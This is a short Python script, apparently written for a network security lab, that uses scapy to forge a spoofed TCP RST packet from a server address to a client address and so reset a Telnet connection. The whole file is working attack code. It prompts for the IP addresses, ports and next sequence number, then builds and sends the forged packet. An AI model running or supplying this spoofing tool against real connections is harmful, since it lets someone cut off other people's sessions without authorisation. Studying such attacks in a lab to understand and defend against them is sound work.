# writted by Ira Garrett 10/7/2025
"""
The purpose of this script is to make use of an RST attack against two targets with a TELNET connection. 
"""

# import libraries
import sys
from scapy.all import *
import datetime

# rst_attack
"""
Function for sending an RST packet, created to appear to be originating from server_ip and to client_ip.
It attaches the relavent ports, and uses the next sequence number to provide an RST attack.
"""
def rst_attack(server_ip, client_ip, server_port, client_port, next_squence):

    # build IP level
    ip = IP(dst=client_ip, src=server_ip)
    
    # build TCP level; R flag is for RST
    tcp = TCP(  
        sport=int(server_port), 
        dport=int(client_port), 
        flags='R', 
        seq=int(next_squence))  
    
    # combine IP and TCP layers into a single packet
    pkt = ip/tcp                   

    ls(pkt)

    # send packet, with verbosity setting to 0 (verbose = 1 is default, showing when packet is sent)
    send(pkt, verbose = 0)      
    print(f"Reset attack sent at {datetime.datetime.now()}")

# main
if __name__ == "__main__":
    SERVER_IP = input("Please enter server IP address:" )
    CLIENT_IP = input("Please enter client IP address:" )
    SERVER_PORT = input("Please enter server port:" )
    CLIENT_PORT = input("Please enter client port:" )
    NEXT_SEQUENCE = input("Please enter next sequence number:" )

    rst_attack(SERVER_IP, CLIENT_IP, SERVER_PORT, CLIENT_PORT, NEXT_SEQUENCE)